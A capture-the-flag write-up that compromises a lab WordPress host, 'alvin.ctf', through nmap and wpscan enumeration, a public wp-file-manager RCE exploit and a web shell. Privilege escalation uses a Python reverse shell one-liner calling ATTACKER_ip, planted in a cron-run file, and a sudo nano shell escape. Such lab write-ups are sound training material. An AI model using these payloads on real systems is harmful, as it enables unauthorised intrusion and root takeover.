First of all we run our nmap scan

```shell
# Nmap 7.94 scan initiated Sun Sep 17 03:46:45 2023 as: nmap -p- -sVC --min-rate=100 -T4 -v -oN nmap.txt 10.10.236.81
Warning: 10.10.236.81 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.236.81
Host is up (0.18s latency).
Not shown: 65467 closed tcp ports (conn-refused), 66 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:83:00:8b:1e:f6:db:8d:69:70:00:b1:10:90:0f:93 (RSA)
|   256 4a:11:ce:20:5e:0e:07:95:ec:60:0e:b6:4b:b2:e1:dd (ECDSA)
|_  256 78:3a:9a:ea:5b:a2:e8:b7:bd:43:a7:b3:fe:a6:3b:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 17 04:04:07 2023 -- 1 IP address (1 host up) scanned in 1041.73 seconds
```

Navigating to port `80/HTTP` we have a "**site under construction**" page

![](https://i.imgur.com/lH493sY.png)


Viewing `Page-Source` we have a commented message that tells us to add **alvin.ctf** to our `/etc/hosts` file

![](https://i.imgur.com/rC5MMY5.png)

We can do these with the following syntax, then adding the `10.10.236.81    alvin.ctf` line to this file

```shell
sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD/ZSCTF4$ sudo nano /etc/hosts
[sudo] password for sec-fortress: 

--SNIP--
127.0.0.1       localhost
127.0.1.1       Pwn-F0rk-3X3C
10.10.236.81    alvin.ctf
--SNIP--
```

Running our directory bruteforce we have an endpoint called, **wordpress**

![](https://i.imgur.com/huIN1w1.png)

Navigating to the **wordpress** directory we have a website

![](https://i.imgur.com/z14Qgzo.png)

I then decided to run a wordpress scanning tool called `wp-scan`

```shell
sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD/ZSCTF4$ wpscan --url alvin.ctf/wordpress/

--SNIP--
[+] URL: http://alvin.ctf/wordpress/ [10.10.236.81]                                                                   
[+] Started: Sun Sep 17 04:10:14 2023                                                                                                                                                                                                       

Interesting Finding(s):                                                                                               

[+] Headers                                                                                                           
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)                                                                  
 | Found By: Headers (Passive Detection)                                                                              
 | Confidence: 100%                                                                                                   

[+] XML-RPC seems to be enabled: http://alvin.ctf/wordpress/xmlrpc.php                                                
 | Found By: Direct Access (Aggressive Detection)                                                                     
 | Confidence: 100%                                                                                                   
 | References:                                                                                                        
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                                                                                                                       
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                                                                                                                                     
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                                      
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                                                                                                      
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                                                                                                   

[+] WordPress readme found: http://alvin.ctf/wordpress/readme.html                                                    
 | Found By: Direct Access (Aggressive Detection)                                                                     
 | Confidence: 100%                                                                                                                                                                                                                         

[+] Upload directory has listing enabled: http://alvin.ctf/wordpress/wp-content/uploads/                                                                                                                                                    
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                                           
 | Confidence: 100%                                                                                                   

[+] The external WP-Cron seems to be enabled: http://alvin.ctf/wordpress/wp-cron.php                                  
 | Found By: Direct Access (Aggressive Detection)                                                                     
 | Confidence: 60%                                                                                                    
 | References:                                                                                                        
 |  - https://www.iplocation.net/defend-wordpress-from-ddos                                                           
 |  - https://github.com/wpscanteam/wpscan/issues/1299                                                                

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).                                              
 | Found By: Rss Generator (Passive Detection)                                                                        
 |  - http://alvin.ctf/wordpress/feed/, <generator>https://wordpress.org/?v=5.6</generator>                                                                                                                                                 
 |  - http://alvin.ctf/wordpress/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>                                                                                                                                        

[+] WordPress theme in use: twentyseventeen                                                                           
 | Location: http://alvin.ctf/wordpress/wp-content/themes/twentyseventeen/                                                                                                                                                                  
 | Last Updated: 2023-03-29T00:00:00.000Z                                                                             
 | Readme: http://alvin.ctf/wordpress/wp-content/themes/twentyseventeen/readme.txt                                    
 | [!] The version is out of date, the latest version is 3.2                                                          
 | Style URL: http://alvin.ctf/wordpress/wp-content/themes/twentyseventeen/style.css?ver=20201208                                                                                                                                           
 | Style Name: Twenty Seventeen                                                                                                                                                                                                             
 | Style URI: https://wordpress.org/themes/twentyseventeen/                                                           
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...                                                                                                                     
 | Author: the WordPress team                                                                                         
 | Author URI: https://wordpress.org/                                                                                 
 |                                                                                                                    
 | Found By: Css Style In Homepage (Passive Detection)                                                                
 | Confirmed By: Css Style In 404 Page (Passive Detection)                                                            
 |                                                                                                                    
 | Version: 2.5 (80% confidence)                                                                                      
 | Found By: Style (Passive Detection)
 
 |  - http://alvin.ctf/wordpress/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.5'                                                                                                                            

[+] Enumerating All Plugins (via Passive Methods)                                                                     

[i] No plugins Found.                                                                                                 

[+] Enumerating Config Backups (via Passive and Aggressive Methods)                                                   
 Checking Config Backups - Time: 00:00:26 <=============================================================================================> (137 / 137) 100.00% Time: 00:00:26                                                                

[i] No Config Backups Found.                                                                                          

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                    
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register                                                                                                                                       

[+] Finished: Sun Sep 17 04:11:42 2023                                                                                
[+] Requests Done: 169                                                                                                
[+] Cached Requests: 6                                                                                                
[+] Data Sent: 44.029 KB                                                                                              
[+] Data Received: 426.373 KB                                                                                         
[+] Memory used: 259.102 MB                                                                                           
[+] Elapsed time: 00:01:27                                                            
```

Checking the `REAME.html` file i was able to find the login page at `http://alvin.ctf/wordpress/wp-login.php`

![](https://i.imgur.com/LNykd90.png)

I decided to enumerate for usernames and since i know we got a clue to the username, **Alvin**, well it existed, I tried several method to bypass login including bruteforcing but to no avail 😓

![](https://i.imgur.com/ZB9sU3k.png)

Then i remember a wise man once said always enumerate plugins, at least we don't need to be authenticated before we can enumerate plugins, Navigating to `http://alvin.ctf/wordpress/wp-content/plugins/` we can see the list of available plugins.

![](https://i.imgur.com/THsNCIy.png)


Enumerating these plugins , i found out the **wp-file-manager** plugin is vulnerable to `RCE`, You can get the exploit from [here](https://github.com/BLY-Coder/Python-exploit-CVE-2020-25213)

![](https://i.imgur.com/z5vSmZB.png)

Launching our exploit we can transfer a web shell to the target then navigate to where it is located in our browser

![](https://i.imgur.com/Iuyi0t0.jpg)

![](https://i.imgur.com/ArC8HAJ.png)

As we can see, Now we can execute commands here and it should work just fine, i will be using a PHP reverse shell payload gotten from https://www.revshells.com/

![](https://i.imgur.com/B2ByDho.png)

### Privilege Escalation

We have a cron job running on the user **Alvin's** home directory, it is running a executing a python file

![](https://i.imgur.com/YfPg9ge.png)

We can manipulate this file, by overwriting it with these particular payload, Make sure to replace `ATTACKER_ip` with your respective IP and `PORT` with desire port

```shell
import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_ip",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash -i")
```

Save this file and start up a `netcat` listener, you should get shell as user **Alvin** back

![](https://i.imgur.com/0uEPSDj.png)

Doing `sudo -l` we can run the `Nano` command line text editor with sudo privileges, this can be used to read and write to password files like **/etc/shadow** and **/etc/passwd** 

![](https://i.imgur.com/E0d2b1g.png)

But we are gonna try out new stuff, we can use `nano` to get a direct shell instead

- First of all do `sudo /bin/nano`
- Then `Ctrl+r`
- Then `Ctrl+x`
- Then Paste in the command below and you should have shell as root

```shell
reset; sh 1>&0 2>&0
```

![](https://i.imgur.com/aLTK1W0.png)

Enjoy your weekends and have fun 😘

<iframe src="https://giphy.com/embed/ff54BctkWA5ry" width="480" height="216" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/bleach-ichigo-vasto-lorde-ff54BctkWA5ry"></a></p>

